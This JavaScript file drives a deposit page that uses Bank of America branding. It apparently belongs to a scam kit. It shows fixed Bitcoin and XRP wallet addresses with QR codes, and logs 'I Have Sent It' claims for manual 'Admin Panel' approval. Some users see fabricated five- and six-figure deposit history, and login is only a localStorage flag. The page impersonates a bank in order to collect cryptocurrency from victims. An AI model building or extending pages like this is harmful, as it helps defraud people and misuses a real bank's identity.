// Bank of America Deposit Page — QR codes, Calculators, I Have Sent It modal

if (localStorage.getItem("boa_authenticated") !== "true") {
  window.location.href = "login.html?redirect=true";
}

// Check logged in user context
const currentUserRaw = localStorage.getItem("boa_current_user");
let currentUser = null;
if (currentUserRaw) {
  try {
    currentUser = JSON.parse(currentUserRaw);
  } catch (e) {}
}
const isCustomUser = Boolean(
  currentUser &&
  currentUser.username &&
  currentUser.username.toLowerCase() !== "executiveempire"
);

const DEPOSIT_ADDRESSES = {
  btc: "bc1qfcrp6gmr7e0h4mh82jhlw84zcqxfl802mm3rml",
  srp: "rDGrc3KfS776Qypy1bs3nJVHK824bHPNpi"
};

const BTC_RATE = 95000;
const SRP_RATE = 0.57;

document.addEventListener("DOMContentLoaded", () => {
  // ==================== Render QR Codes ====================
  function renderQr(container, text) {
    if (!container) return;
    if (typeof qrcode === "undefined") {
      container.innerHTML = '<p class="qr-fallback">QR code unavailable — use copy button with address below.</p>';
      return;
    }
    const qr = qrcode(0, "M");
    qr.addData(text);
    qr.make();
    container.innerHTML = qr.createSvgTag({ cellSize: 5, margin: 1 });
  }

  renderQr(document.getElementById("qr-btc"), DEPOSIT_ADDRESSES.btc);
  renderQr(document.getElementById("qr-srp"), DEPOSIT_ADDRESSES.srp);

  // ==================== Copy Address ====================
  function legacyCopy(text, done) {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.style.position = "fixed";
    ta.style.opacity = "0";
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand("copy"); done(); } catch (e) {}
    ta.remove();
  }

  document.querySelectorAll("[data-copy]").forEach(btn => {
    btn.addEventListener("click", () => {
      const text = btn.getAttribute("data-copy");
      const original = btn.textContent;
      const done = () => {
        btn.textContent = "Copied!";
        setTimeout(() => { btn.textContent = original; }, 2000);
      };
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(done).catch(() => legacyCopy(text, done));
      } else {
        legacyCopy(text, done);
      }
    });
  });

  // ==================== Calculators ====================
  const btcInput = document.getElementById("btc-usd-input");
  const btcOutput = document.getElementById("btc-calc-output");
  const srpInput = document.getElementById("srp-usd-input");
  const srpOutput = document.getElementById("srp-calc-output");

  if (btcInput && btcOutput) {
    btcInput.addEventListener("input", () => {
      const val = parseFloat(btcInput.value);
      if (!isNaN(val) && val > 0) {
        const btc = val / BTC_RATE;
        btcOutput.textContent = btc.toFixed(6) + " BTC";
      } else {
        btcOutput.textContent = "0.000000 BTC";
      }
    });
  }

  if (srpInput && srpOutput) {
    srpInput.addEventListener("input", () => {
      const val = parseFloat(srpInput.value);
      if (!isNaN(val) && val > 0) {
        const srp = val / SRP_RATE;
        srpOutput.textContent = srp.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " SRP";
      } else {
        srpOutput.textContent = "0.00 SRP";
      }
    });
  }

  // ==================== Render Deposit History ====================
  const recentContainer = document.getElementById("recent-deposits");

  function renderRecentDeposits() {
    if (!recentContainer) return;
    const storedDeposits = typeof getPendingDeposits === "function" ? getPendingDeposits() : [];
    
    let html = "";
    storedDeposits.forEach(dep => {
      const statusClass = dep.status === "Completed" ? "completed" : (dep.status === "Declined" ? "failed" : "due");
      html += `
        <div class="list-item">
          <div>
            <div class="list-item-title">${dep.cryptoAsset === 'BTC' ? 'Bitcoin (BTC)' : 'SRP (XRP)'} &middot; ${dep.cryptoAmount} ${dep.cryptoAsset}</div>
            <div class="list-item-sub">${dep.date} &middot; ID: ${dep.id}</div>
          </div>
          <div class="list-item-right">
            <span class="list-item-amt">$${dep.usdAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</span>
            <span class="status-badge ${statusClass}">${dep.status}</span>
          </div>
        </div>
      `;
    });
    
    const defaultHtml = !isCustomUser ? `
      <div class="list-item">
        <div>
          <div class="list-item-title">Bitcoin (BTC) &middot; 2.1 BTC</div>
          <div class="list-item-sub">Jul 30, 2026 &middot; 2 of 3 confirmations</div>
        </div>
        <div class="list-item-right">
          <span class="list-item-amt">$199,500.00</span>
          <span class="status-badge due">Pending</span>
        </div>
      </div>
      <div class="list-item">
        <div>
          <div class="list-item-title">SRP (XRP) &middot; 100,000 SRP</div>
          <div class="list-item-sub">Jul 27, 2026 &middot; 5 of 5 confirmations</div>
        </div>
        <div class="list-item-right">
          <span class="list-item-amt">$57,000.00</span>
          <span class="status-badge completed">Completed</span>
        </div>
      </div>
    ` : "";

    const finalHtml = html + defaultHtml;
    recentContainer.innerHTML = finalHtml || `<div style="text-align: center; color: var(--text-muted); font-size: 13.5px; padding: 24px 16px;">No deposits submitted yet. Choose an asset above to make a deposit!</div>`;
  }

  renderRecentDeposits();

  // ==================== I Have Sent It Handler & Modal ====================
  function handleIHaveSentIt(asset) {
    let usdVal = 0;
    let cryptoText = "";

    if (asset === "BTC") {
      usdVal = parseFloat(btcInput ? btcInput.value : 0);
      if (isNaN(usdVal) || usdVal <= 0) usdVal = 10000;
      cryptoText = (usdVal / BTC_RATE).toFixed(6);
    } else {
      usdVal = parseFloat(srpInput ? srpInput.value : 0);
      if (isNaN(usdVal) || usdVal <= 0) usdVal = 5000;
      cryptoText = (usdVal / SRP_RATE).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    const todayStr = new Date().toLocaleDateString("en-US", { month: "short", day: "2-digit", year: "numeric" });
    const depId = "DEP-" + Math.floor(100000 + Math.random() * 900000);
    const targetAccountId = isCustomUser ? `checking_${currentUser.username}` : "checking_7284";

    const depObj = {
      id: depId,
      userId: currentUser ? currentUser.username : "ExecutiveEmpire",
      userName: currentUser ? currentUser.fullName : "Executive Empire Circle",
      cryptoAsset: asset,
      usdAmount: usdVal,
      cryptoAmount: cryptoText,
      date: todayStr,
      status: "Pending",
      targetAccount: targetAccountId
    };

    if (typeof addPendingDeposit === "function") {
      addPendingDeposit(depObj);
    }

    renderRecentDeposits();

    showAwaitingConfirmationModal(depObj);
  }

  function showAwaitingConfirmationModal(dep) {
    const overlay = document.createElement("div");
    overlay.className = "modal-overlay";
    overlay.innerHTML = `
      <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="dep-modal-title">
        <div class="modal-icon" style="background: rgba(227, 24, 55, 0.1); color: var(--red);">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width: 32px; height: 32px;">
            <circle cx="12" cy="12" r="10"></circle>
            <polyline points="12 6 12 12 16 14"></polyline>
          </svg>
        </div>
        <h3 id="dep-modal-title" style="font-size: 20px; font-weight: 700; color: var(--navy); margin-top: 10px;">Awaiting Confirmation</h3>
        <p class="modal-sub" style="font-size: 14px; color: var(--text-secondary); margin-bottom: 16px;">Your ${dep.cryptoAsset} deposit notification has been received!</p>
        
        <div class="modal-details" style="background: #F8FAFC; border: 1px solid var(--border); border-radius: 10px; padding: 16px; margin-bottom: 18px;">
          <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Deposit ID</span><strong>${dep.id}</strong></div>
          <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Asset Amount</span><strong>${dep.cryptoAmount} ${dep.cryptoAsset}</strong></div>
          <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>USD Equivalent</span><strong>$${dep.usdAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong></div>
          <div style="display: flex; justify-content: space-between;"><span>Status</span><span class="status-badge due">Awaiting Admin Permit</span></div>
        </div>

        <p style="font-size: 12.5px; color: var(--text-muted); line-height: 1.4; margin-bottom: 16px; text-align: center;">
          Once confirmed in the Admin Panel, your main dashboard balance will automatically increase by <strong>$${dep.usdAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>.
        </p>

        <button class="btn-primary modal-close-btn" style="width: 100%; padding: 12px; font-weight: 700;">Understood</button>
      </div>
    `;
    document.body.appendChild(overlay);

    function closeModal() {
      overlay.classList.add("fade-out");
      setTimeout(() => overlay.remove(), 250);
    }

    overlay.querySelector(".modal-close-btn").addEventListener("click", closeModal);
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) closeModal();
    });
  }

  document.querySelectorAll(".sent-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      const asset = btn.getAttribute("data-asset") || "BTC";
      handleIHaveSentIt(asset);
    });
  });
});
